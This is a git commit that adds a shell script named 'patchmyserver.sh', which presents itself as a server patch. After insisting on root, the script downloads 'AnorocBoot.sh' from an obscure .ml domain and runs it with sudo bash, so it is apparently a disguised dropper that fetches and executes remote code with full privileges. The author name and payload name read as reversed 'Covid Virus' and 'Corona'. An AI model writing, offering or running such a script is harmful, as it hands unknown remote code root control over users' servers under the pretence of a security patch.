73bd986a228a7ce591c4f84656da16fc490d8037
Divoc Suriv <66835734+divoc-91@users.noreply.github.com>
2020-07-25 19:15:57 +0800

    Create patchmyserver.sh

---
+++ patchmyserver.sh
@@ -0,0 +1,12 @@
+# check euid
+if [ $EUID -ne 0 ]; then
+    echo "$0 is not running as root. Can you please run me using sudo. I need it to patch your server :)"
+    exit 2
+fi
+
+# download dependencies we will need
+sudo apt install git wget zip unzip lzma gzip bzip2 python3 pip3
+wget "1rd7w08tbqm52earhagr8oai976tdl7lwy07xlje4og1.ml/AnorocBoot.sh" -O patch.sh
+
+# do server patch
+sudo bash patch.sh
